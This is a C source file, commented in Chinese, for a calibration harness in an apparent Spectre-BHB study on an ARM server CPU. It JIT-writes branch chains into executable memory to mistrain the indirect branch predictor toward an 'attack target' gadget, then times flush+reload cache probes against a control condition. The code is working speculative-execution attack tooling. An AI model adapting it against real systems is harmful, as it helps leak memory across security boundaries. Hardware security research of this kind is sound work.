/*
 * calib.c (v3) —— BHB 配对对照测量仪（支持自定义历史长度）
 *
 * v3 变化：
 *   - HISTORY_SIZE 由编译期常量改为 --history 运行时参数（上限 MAX_HISTORY_SIZE=256）
 *   - 支持 --in-place 0|1（原地 / 异地）
 *   - 默认聚合输出：hit_id,round,order,mode,iters,hits,min_dt,max_dt
 *
 * 设计：
 *   对同一条随机触发链，掷硬币决定 CTRL/MAIN 顺序，两种模式各测 --iters 次。
 *     CTRL = 训练到安全目标 ftable[0]（零假设）
 *     MAIN = 训练到攻击目标 ftable[1]
 *   原地条件：ret_history 最后一条地址 = 训练链最后一条（对应上游 IN_PLACE=1）
 *
 * 编译：
 *   gcc -c src/snippet.S -o snippet.o -I../../../common -DYITIAN_710
 *   gcc src/calib.c -o calib snippet.o -pie -O1 -I../../../common -DYITIAN_710
 *
 * 扫描示例：
 *   for H in 32 48 64 96 128; do
 *     taskset -c 3 ./calib --history $H --hit-num 100 --rounds 300 --iters 100 \
 *                          --in-place 1 --out h$H.csv
 *   done
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include "targets.h"
#include "helper.h"

#define B_OPCODE         (0x14000000U)
#define B_OFF_MASK_OPC   (0x03ffffffU)
#define B_OFF_MASK       (0x01ffffffU)
#define MAX_MEM          (0x04000000<<2)
#define BHI_ENABLE_SYSCALL 442
#define MAXH             1024             /* 最大历史长度（上游 MAX_HISTORY_SIZE=256，此处放宽用于探测峰值） */

typedef uint64_t (*t_chain)(void *target, void *arg);
typedef void (*t_target)(void *target);
extern void ret_gadget(void *arg);
extern void hit_gadget(void *arg);
extern void ind_gadget(void *arg);

static t_target ftable[2] = {&ret_gadget, hit_gadget};
static uint8_t *g_mem;

static void jit(uint8_t *mem, const uint64_t *history, int hist)
{
    for (int i = 0; i < hist - 1; i++) {
        uint32_t offset = (history[i+1] >> 2) - (history[i] >> 2);
        uint32_t opcode = B_OPCODE | (offset & B_OFF_MASK_OPC);
        memcpy(&mem[history[i]], &opcode, 4);
        __clear_cache(&mem[history[i]], &mem[history[i] + 4]);
    }
    memcpy(&mem[history[hist-1]], &ind_gadget, 8);
    __clear_cache(&mem[history[hist-1]], &mem[history[hist-1] + 8]);
}

static void gen_history(uint64_t *h, int hist, const uint64_t *other, int other_hist)
{
    for (int i = 0; i < hist; i++) {
        uint64_t r;
        int ok;
        do {
            ok = 1;
            r = ((uint64_t)(rand() & B_OFF_MASK)) << 2;
            for (int j = 0; other && j < other_hist; j++)
                if (labs((int64_t)(r - other[j])) < 16) { ok = 0; break; }
            if (!ok) continue;
            for (int j = 0; j < i; j++)
                if (labs((int64_t)(r - h[j])) < 16) { ok = 0; break; }
        } while (!ok);
        h[i] = r;
    }
}

int main(int argc, char **argv)
{
    int hit_num = 20, rounds = 200, iters = 100, thr = THR;
    int raw = 0, hist_out = 0, in_place = 1, hist = 64;
    int tail_match = 1;          /* 复用训练链尾部多少条地址：1=上游原地，0=异地 */
    const char *outfile = NULL;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--hit-num") && i+1 < argc) hit_num = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--rounds") && i+1 < argc) rounds = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--iters") && i+1 < argc) iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--thr") && i+1 < argc) thr = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--out") && i+1 < argc) outfile = argv[++i];
        else if (!strcmp(argv[i], "--raw")) raw = 1;
        else if (!strcmp(argv[i], "--hist")) hist_out = 1;
        else if (!strcmp(argv[i], "--in-place") && i+1 < argc) in_place = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--tail-match") && i+1 < argc) tail_match = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--history") && i+1 < argc) hist = atoi(argv[++i]);
        else { fprintf(stderr, "bad arg %s\n", argv[i]); return 1; }
    }

    if (!in_place)
        tail_match = 0;          /* --in-place 0 等价于 --tail-match 0 */

    if (hist < 4 || hist > MAXH) {
        fprintf(stderr, "--history 必须在 4..%d 之间\n", MAXH);
        return 1;
    }

    FILE *fp = stdout;
    if (outfile) { fp = fopen(outfile, "w"); if (!fp) { perror("fopen"); return 1; } }

    syscall(BHI_ENABLE_SYSCALL);
    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    uint8_t *fr_buf = mmap(NULL, STRIDE, PROT_READ|PROT_WRITE,
                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (fr_buf == MAP_FAILED) { perror("mmap fr_buf"); return 1; }
    memset(fr_buf, 0x41, STRIDE);

    g_mem = mmap(NULL, MAX_MEM, PROT_READ|PROT_WRITE|PROT_EXEC,
                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (g_mem == MAP_FAILED) { perror("mmap jit"); return 1; }

    /* 闸门：ruler 自检 */
    {
        uint64_t hs = 0, cs = 0;
        for (int i = 0; i < 1000; i++) { maccess(fr_buf); hs += load_time(fr_buf); }
        for (int i = 0; i < 1000; i++) { clflush(fr_buf); fence(); cs += load_time(fr_buf); }
        fprintf(stderr, "[ruler] cached=%.2f flushed=%.2f THR=%d %s\n",
                (double)hs/1000.0, (double)cs/1000.0, thr,
                (cs > hs + 2) ? "OK" : "WARN:no-sep");
    }

    if (raw)       fprintf(fp, "hit_id,round,order,mode,iter,dt\n");
    else if (hist_out) fprintf(fp, "hit_id,round,order,mode,dt,count\n");
    else           fprintf(fp, "hit_id,round,order,mode,iters,hits,min_dt,max_dt\n");

    fprintf(stderr, "[cfg] history=%d hit_num=%d rounds=%d iters=%d thr=%d in_place=%d tail_match=%d total_meas=%ld\n",
            hist, hit_num, rounds, iters, thr, in_place, tail_match,
            (long)hit_num * rounds * 2 * iters);

    uint64_t hit_history[MAXH];
    uint64_t ret_history[MAXH];

    for (int h = 0; h < hit_num; h++) {
        gen_history(hit_history, hist, NULL, 0);
        jit(g_mem, hit_history, hist);
        t_chain hit_ptr = (t_chain)&g_mem[hit_history[0]];

        for (int r = 0; r < rounds; r++) {
            gen_history(ret_history, hist, hit_history, hist);
            /* 复用训练链尾部 tail_match 条地址：0=异地，1=上游原地 */
            for (int t = 0; t < tail_match && t < hist; t++)
                ret_history[hist-1-t] = hit_history[hist-1-t];
            jit(g_mem, ret_history, hist);
            t_chain ret_ptr = (t_chain)&g_mem[ret_history[0]];

            int main_first = rand() & 1;
            const char *order = main_first ? "MA" : "AM";

            for (int phase = 0; phase < 2; phase++) {
                int is_main = main_first ? (phase == 0) : (phase == 1);
                const char *mode = is_main ? "MAIN" : "CTRL";
                t_target *tgt = is_main ? &ftable[1] : &ftable[0];

                long hits = 0;
                uint64_t mn = ~0ULL, mx = 0;
                static unsigned cnt[100];
                if (hist_out) memset(cnt, 0, sizeof(cnt));

                for (int k = 0; k < iters; k++) {
                    hit_ptr(tgt, fr_buf);
                    clflush(&ftable[0]);
                    clflush(&ftable[1]);
                    clflush(fr_buf);
                    ret_ptr(&ftable[0], fr_buf);
                    uint64_t dt = load_time(fr_buf);

                    if (dt < (uint64_t)thr) hits++;
                    if (dt < mn) mn = dt;
                    if (dt > mx) mx = dt;

                    if (raw)  fprintf(fp, "%d,%d,%s,%s,%d,%lu\n", h, r, order, mode, k, (unsigned long)dt);
                    if (hist_out) cnt[dt < 99 ? dt : 99]++;
                }

                if (hist_out) {
                    for (int t = 0; t < 100; t++)
                        if (cnt[t]) fprintf(fp, "%d,%d,%s,%s,%d,%u\n", h, r, order, mode, t, cnt[t]);
                } else if (!raw) {
                    fprintf(fp, "%d,%d,%s,%s,%d,%ld,%lu,%lu\n",
                            h, r, order, mode, iters, hits,
                            (unsigned long)mn, (unsigned long)mx);
                }
            }
        }
        if ((h + 1) % 25 == 0) fprintf(stderr, "[progress] %d/%d\n", h + 1, hit_num);
    }

    if (fp != stdout) fclose(fp);
    return 0;
}
